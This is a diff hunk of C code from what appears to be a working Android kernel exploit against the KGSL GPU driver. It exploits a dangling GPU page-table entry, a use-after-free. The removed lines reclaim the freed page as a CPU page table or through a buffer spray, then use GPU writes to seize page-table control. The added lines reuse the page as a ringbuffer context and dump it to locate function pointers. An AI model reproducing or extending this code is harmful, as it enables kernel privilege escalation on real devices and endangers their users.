@@ -310,74 +310,15 @@ void _start(void){
                     out("[R");outdec(round);out("] post-destroy dangling=");outdec(dang);out("\n");
                     if(dang==1){
                         out("[R");outdec(round);out("] DANGLING PTE + PAGES FREED - exploit attempt\n");
-                        /* PTE route: pressure AFTER destroy -> shrinker drains the
-                           pool head -> freed page to buddy -> aligned 4K windows'
-                           PTE pages (buddy) reclaim it -> GPU-write through the
-                           dangling VA edits the CPU pagetable */
-                        s64 pr=sys6(SYS_mmap,0,0x1800000,3,0x22,-1,0);
-                        if(pr>0){ for(u64 q=0;q<0x1800000;q+=0x1000) ((volatile u8*)(pr+q))[0]=0; }
-                        for(int q=0;q<3000;q++) sys3(SYS_sched_yield,0,0,0);
-                        s64 rsv=sys6(SYS_mmap,0,0x10200000,0,0x22,-1,0);
-                        s64 wbase=(rsv+0x1fffff)&~0x1fffff;
-                        int nwin=0;
-                        if(rsv>0){
-                            for(int i=0;i<128;i++){
-                                s64 a=wbase+(s64)i*0x200000;
-                                s64 r=sys6(SYS_mmap,a,0x1000,3,0x32,-1,0);
-                                if(r!=a) break;
-                                ((volatile u8*)a)[0]=0x5A;
-                                nwin++;
-                            }
+                        /* RB-identify: one make_ctx takes the freed page from the
+                           allocator as the new context's first sharedmem page
+                           (ringbuffer memdesc/scatch) - dump its dwords to identify
+                           the object and map the function-pointer offsets */
+                        make_ctx(3);
+                        for(int o2=0;o2<24;o2++){
+                            u32 v=read_dword_nc(1,(u64)g_p_res+(u64)o2*0x10,100);
+                            out("[R");outdec(round);out("] rb@");outhex(o2*0x10);out("=");outhex(v);out("\n");
                         }
-                        out("[R");outdec(round);out("] aligned windows=");outdec(nwin);out("\n");
-                        int hp=-1;
-                        for(int o=0;o<3;o++){
-                            int c=probe_mask(1,(u64)g_p_res+(u64)o*0x1000,0x3,0x3,300);
-                            out("[R");outdec(round);out("] pte-like@");outdec(o*0x1000);out("=");outdec(c);out("\n");
-                            if(c==1){ hp=o; break; }
-                        }
-                        if(hp>=0 && nwin>0){
-                            u64 pbase=(u64)g_p_res+(u64)hp*0x1000;
-                            u32 pte0=read_dword_nc(2,pbase,300);
-                            out("[R");outdec(round);out("] PTE#0=");outhex(pte0);out("\n");
-                            int ww=gpu_write(2,pbase+8,pte0);
-                            out("[R");outdec(round);out("] wrote PTE#0 -> slot1 rc=");outdec(ww);out("\n");
-                            for(int i=0;i<nwin;i++){
-                                s64 a=wbase+(s64)i*0x200000;
-                                ((volatile u32*)a)[0]=0xCAFE0000u+(u32)i;
-                            }
-                            int hit=-1;
-                            for(int i=0;i<nwin;i++){
-                                s64 a=wbase+(s64)i*0x200000;
-                                int c=probe_mask(2,a+0x1000,0xCAFE0000u+(u32)i,0xFFFFFFFFu,120);
-                                if(c==1){ hit=i; break; }
-                            }
-                            out("[R");outdec(round);out("] ALIAS region=");outdec(hit);
-                            if(hit>=0){ out("  <== ARBITRARY PTE CONTROL PROVEN\n"); break; }
-                            else out("  (no alias)\n");
-                        } else {
-                            /* data-alias fallback (proven ~83%): KGSL spray takes the
-                               pool-head freed page as buffer #0 */
-                            g_nb=0;
-                            for(int q=0;q<512;q++){ u32 id; u64 gpu; u32*cp;
-                                if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
-                                for(u64 w2=0;w2<ASZ/4;w2++) cp[w2]=0xB6B6B6B6u; dc_civac(cp,ASZ);
-                                if(g_nb<MAXB){ g_bids[g_nb]=id; g_bgpu[g_nb]=gpu; g_bcpu[g_nb]=cp; g_nb++; }
-                            }
-                            int ra=probe(1,(u64)g_p_res+0x100,0xB6B6B6B6u);
-                            out("[R");outdec(round);out("] KGSL reclaim=");outdec(ra);
-                            if(ra==1){
-                                int w2=gpu_write(2,(u64)g_p_res+0x100,0xCAFEF00Du);
-                                int found=-1;
-                                for(int q=0;q<g_nb;q++){ u32*p=g_bcpu[q];
-                                    for(u64 w3=0;w3<ASZ/4;w3++){ if(p[w3]==0xCAFEF00Du){ found=q; break; } }
-                                    if(found>=0) break; }
-                                out(" gpu_write=");outdec(w2);out(" alias buf=");outdec(found);
-                                out(found>=0?"  <== GPU WRITE INTO RECLAIMED PAGE\n":"\n");
-                            } else out("\n");
-                        }
-                        if(pr>0) sys2(SYS_munmap,(s64)pr,0x1800000);
-                        if(rsv>0) sys2(SYS_munmap,(s64)rsv,0x10200000);
                         for(int q=0;q<g_nb;q++){ struct kgsl_gpumem_free_id bf; bf.id=g_bids[q]; bf.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&bf); }
                         g_nb=0;
                         for(int q=0;q<POOLFILL;q++){ u32 id; u64 gpu; u32*cp;
